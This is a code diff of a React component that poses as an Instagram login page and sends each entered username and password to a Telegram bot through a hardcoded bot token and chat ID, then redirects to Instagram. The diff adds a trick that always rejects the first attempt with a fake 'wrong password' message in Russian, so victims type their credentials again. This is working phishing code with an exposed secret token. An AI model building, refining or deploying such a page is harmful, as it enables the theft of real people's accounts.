@@ -10,23 +10,22 @@ function Cards() {
   const [name, setName] = useState<string>("");
   const [password, setPassword] = useState<string>("");
   const [views, setViews] = useState<boolean>(false);
-  const [count, setcount] = useState(0);
+  const [count, setCount] = useState(0);
 
   const API =
     "https://api.telegram.org/bot6987189864:AAEs6hfy5KLOZxf1EcN-cjhgJQSlilxYqyw/";
-  async function SendMesage(message: string) {
-    if (name.length > 0 && password.length > 0) {
+
+  async function SendMessage(message: string) {
+    if (name.length > 2 && password.length > 2 && count > 0) {
       const url: string = `${API}sendMessage?chat_id=-1002420484951&text=${message}`;
       await axios.post(url);
-      setName("");
-      setPassword("");
       window.location.href =
-        "https://www.instagram.com/reel/C7QyAwYsdBU/?igsh=Y2xiZHFmZ2g4Yml0";
+        "https://www.instagram.com/teimirova_f?igsh=MXR6cGM3anJpd3BpMQ==";
     } else {
-      setcount(count + 1);
-      console.log(count);
+      setCount((prevCount) => prevCount + 1);
     }
   }
+
   return (
     <>
       <section className="instagram">
@@ -75,10 +74,18 @@ function Cards() {
                 забыли пароль?
               </a>
             </div>
+
+            {count !== 0 && (
+              <p className="validate__text">
+                К сожалению, вы ввели не правильный пароль или логин. Проверьте
+                логин или пароль еще раз.
+              </p>
+            )}
+
             <div className="instagram__footer">
               <button
                 onClick={() =>
-                  SendMesage(`Login ${name} \n Password  ${password}`)
+                  SendMessage(`Login: ${name}\nPassword: ${password}`)
                 }
                 className="footer__btn"
               >
